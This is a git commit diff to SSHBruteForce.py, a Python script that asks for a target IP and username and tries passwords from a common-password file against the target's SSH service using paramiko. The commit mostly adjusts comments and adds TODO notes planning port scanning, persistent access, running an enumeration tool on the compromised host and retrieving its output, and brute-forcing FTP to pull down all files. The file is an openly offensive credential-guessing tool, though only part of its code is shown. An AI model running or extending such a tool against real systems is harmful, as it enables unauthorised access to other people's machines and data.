060c8cedf1cfece030dea46790f8929862b9ae34
ParadoxReagent <73672349+ParadoxReagent@users.noreply.github.com>
2021-09-16 13:21:46 -0400

    Update SSHBruteForce.py

--- SSHBruteForce.py
+++ SSHBruteForce.py
@@ -3,8 +3,9 @@
 from pwn import *
 import paramiko
 
-host = input("Please type in your targets IP address: ")	#user enters in host SSH IP
-username = input("Please type in your targets username: ")	#user enters in username they would like to use for brute force
+host = input("Please type in your targets IP address: ")	# user enters in host SSH IP
+username = input("Please type in your targets username: ")	# user enters in username they would like to use for brute force
+## password_file = input("Please enter desired password.txt") 
 attempts = 0
 
 with open("ssh-common-passwords.txt", "r") as password_list:
@@ -21,3 +22,15 @@ with open("ssh-common-passwords.txt", "r") as password_list:
 		except paramiko.ssh_exception.AuthenticationException:
 			print("[X] Invalid password!")
 		attempts += 1
+
+
+		
+		## Implement nmap scan (or custom portscan.py) to detect SSH port number if not default - set as variable
+	
+## Give user ability to use whatever password file
+
+## Add persistant connection
+## Once connection established discover OS if unknown - PUT PEAS tool or similar - execute/output to file - GET file
+## Need shell to do this?
+
+## Add FTP scanner/brute force/mget all files?  Only run this scanner if FTP port is present/open?
